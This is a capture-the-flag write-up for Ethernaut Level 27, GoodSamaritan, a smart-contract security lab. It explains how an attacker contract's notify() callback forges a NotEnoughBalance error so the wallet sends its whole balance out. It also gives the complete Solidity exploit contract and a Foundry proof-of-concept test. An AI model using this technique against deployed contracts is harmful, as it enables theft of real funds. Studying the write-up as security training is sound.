# Level 27 - GoodSamaritan

## Objectives

- drain all the balance from `GoodSamaritan` `Wallet`

## Contract Overview

Contract Overview:

The `GoodSamaritan`contract serves as a platform for facilitating donations of a specific `Coin` to individuals in need. Upon deployment, it initializes instances of the `Wallet` and `Coin` contracts. Its primary functionality includes requesting donations from potential donors and managing the transfer of donations to the requester while handling situations where the balance is insufficient.

The `Coin`contract represents a token and manages token balances for each address. It facilitates transfers of tokens between addresses and notifies the recipient if the destination address is a contract.

The `Wallet` contract acts as a manager for wallet functionalities, such as donating coins and transferring remainder balances. It tracks the owner of the wallet, enables the donation of a specific number of coins to a recipient, transfers remaining coin balances to a designated address, and sets the `Coin` contract address.

Additionally, the `INotifyable` interface defines the function signature required for contracts that can be notified about incoming token transfers. It mandates contracts to implement a notify function to handle token transfer notifications effectively.

## Finding the weak spots

After analyzing all the contracts, we have identified a weak spot. To drain all the balance from the `GoodSamaritan` `Wallet`, we need to call the `transferRemainder` function. This function transfers the entire balance of the `GoodSamaritan` `Wallet` to the specified recipient.

```solidity
    function transferRemainder(address dest_) external onlyOwner {
        // transfer balance left
        coin.transfer(dest_, coin.balances(address(this)));
    }

```

Within the context of the `requestDonation` function, which is externally callable, there exists the `transferRemainder` function of our interest. This function is invoked within a try-catch block.

During execution, the try block attempts to call `wallet.donate10(msg.sender)`, where `msg.sender` can be any address that invoked the function.

In the event of an error, the catch block validates whether the error message matches the custom error message string `NotEnoughBalance()`. If this condition is met, the wallet transfers the entire balance to us. This is our desired outcome.

Let's examine `donate10` function.

```solidity

    function donate10(address dest_) external onlyOwner {
        // check balance left
        if (coin.balances(address(this)) < 10) {
            revert NotEnoughBalance();
        } else {
            // donate 10 coins
            coin.transfer(dest_, 10);
        }
    }


```

The `donate10` function utilizes the `transfer` function from the `Coin` contract.

```solidity
    function transfer(address dest_, uint256 amount_) external {
        uint256 currentBalance = balances[msg.sender];

        // transfer only occurs if balance is enough
        if (amount_ <= currentBalance) {
            balances[msg.sender] -= amount_;
            balances[dest_] += amount_;

            if (dest_.isContract()) {
                // notify contract
                INotifyable(dest_).notify(amount_);
            }
        } else {
            revert InsufficientBalance(currentBalance, amount_);
        }
    }

```

Upon reviewing this function, we observe that it follows its usual validations, deducting the specified amount from the sender's balance and adding it to the destination's balance. However, one particular validation stands out - the `if(dest_.isContract())` check. This verifies whether the address that initiated the donation request is a contract and invokes the `notify()` function on that address, specifically the `dest_` contract. Given that we have control over the requester address, we can deploy a contract to that address and potentially manipulate the execution flow following the `INotifyable(dest_).notify(amount_)` invocation.

```solidity

interface INotifyable {
    function notify(uint256 amount) external;
}

```

## Plan of the attack

1. Attacker creates `GoodSamaritanAttack` contract providing the address of the `GoodSamaritan` contract.
2. Attacker calls the `attack()` function in the `GoodSamaritanAttack` contract that is invoking `requestDonation` on `GoodSamaritan` contract. The code proceeds to execute the `wallet.donate10(msg.sender)` function call.
3. The `donate10` function utilizes the `transfer` function from the `Coin` contract.
4. The `coin.transfer()` function performs calculations, verifies if `GoodSamaritanAttack` address is a contract, and then triggers a `notify()` function on `GoodSamaritanAttack` address.
5. Attacker creates `notify()` function in `GoodSamaritanAttack` contract to revert with a custom error named `NotEnoughBalance()`. When this error is triggered in the `GoodSamaritan` `requestDonation()` function, the `catch()` block will activate, transferring all tokens to `GoodSamaritanAttack`contract using `transferRemainder` function. But function will revert only if attacker included an additional condition to check if the amount is less than or equal to 10.

## Malicious contract (GoodSamaritanAttack.sol)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "./GoodSamaritan.sol";

contract GoodSamaritanAttack is INotifyable {
    GoodSamaritan victimContract;

    error NotEnoughBalance();

    // 1. Attacker creates `GoodSamaritanAttack` contract providing the address of the `GoodSamaritan` contract.
    constructor(address _victimContract) {
        victimContract = GoodSamaritan(_victimContract);
    }

    // 2. Attacker calls the `attack()` function in the `GoodSamaritanAttack` contract that is invoking `requestDonation` on `GoodSamaritan` contract. The code proceeds to execute the `wallet.donate10(msg.sender)` function call.
    // 3. The `donate10` function utilizes the `transfer` function from the `Coin` contract.
    function attack() public {
        victimContract.requestDonation();
    }

    // 4. The `coin.transfer()` function performs calculations, verifies if `GoodSamaritanAttack` address is a contract, and then triggers a `notify()` function on `GoodSamaritanAttack` address.
    // 5. Attacker creates `notify()` function in `GoodSamaritanAttack` contract to revert with a custom error named `NotEnoughBalance()`. When this error is triggered in the `GoodSamaritan` `requestDonation()` function, the `catch()` block will activate, transferring all tokens to `GoodSamaritanAttack`contract using `transferRemainder` function. But function will revert only if attacker included an additional condition to check if the amount is less than or equal to 10.
    function notify(uint256 amount) external {
        if (amount <= 10) {
            revert NotEnoughBalance();
        }
    }
}

```

## Proof of Concept

Here is a simplified version of the unit test exploiting the vulnerability ([complete version here](https://github.com/matrix-0wl/ethernaut-solutions-foundry/blob/master/test/27-GoodSamaritan.t.sol))

```solidity

        // 1. Attacker creates `GoodSamaritanAttack` contract providing the address of the `GoodSamaritan` contract.
        GoodSamaritanAttack goodSamaritanAttack = new GoodSamaritanAttack(
            address(ethernautGoodSamaritan)
        );

        emit log_named_uint(
            "Balance of GoodSamaritan Wallet before attack",
            ethernautGoodSamaritan.coin().balances(
                address(ethernautGoodSamaritan.wallet())
            )
        );

        emit log_named_uint(
            "Balance of GoodSamaritanAttack contract before attack",
            ethernautGoodSamaritan.coin().balances(address(goodSamaritanAttack))
        );

        emit log_string(
            "--------------------------------------------------------------------------"
        );

        // 2. Attacker calls the `attack()` function in the `GoodSamaritanAttack` contract that is invoking `requestDonation` on `GoodSamaritan` contract. The code proceeds to execute the `wallet.donate10(msg.sender)` function call.
        goodSamaritanAttack.attack();

        emit log_named_uint(
            "Balance of GoodSamaritan Wallet after attack",
            ethernautGoodSamaritan.coin().balances(
                address(ethernautGoodSamaritan.wallet())
            )
        );

        emit log_named_uint(
            "Balance of GoodSamaritanAttack contract after attack",
            ethernautGoodSamaritan.coin().balances(address(goodSamaritanAttack))
        );

```

Here are the logs from the exploit contract:

![alt text](https://github.com/matrix-0wl/ethernaut-solutions-foundry/blob/master/img/GoodSamaritan.png)

## Recommendations

- Relying on external user input to determine critical contract logic is highly risky and not recommended. It opens up the possibility of manipulation and can lead to unpredictable behavior in the contract.

## References

- [Blog Aditya Dixit](https://blog.dixitaditya.com/ethernaut-level-27-good-samaritan)

## Acknowledgements

The structure of my reports is based on the insights provided by:

- [ChmielewskiKamil](https://github.com/ChmielewskiKamil/ethernaut-foundry)
- [alex0207s](https://github.com/alex0207s/ethernaut-foundry-boilerplate)
- [Joran Honig Twitter thread](https://twitter.com/joranhonig/status/1539578735631949825?s=20&t=Kp6iDNXfRKQUBbsb_Yj5SQ)
